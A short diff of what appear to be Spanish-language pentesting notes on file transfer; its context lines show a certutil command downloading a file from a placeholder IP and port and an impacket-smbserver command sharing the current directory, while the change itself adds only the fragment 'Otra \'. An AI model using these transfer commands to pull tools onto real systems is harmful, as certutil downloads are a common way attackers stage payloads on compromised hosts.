@@ -64,7 +64,7 @@ Windows:
 ```sh
 certutil -urlcache -f http://<ip que esta enviando el archivo>:<puerto>/archivo.extension archivo.extension
 ```
-
+Otra \
 linux:
 ```sh
 impacket-smbserver recurso $(pwd) -smb2support
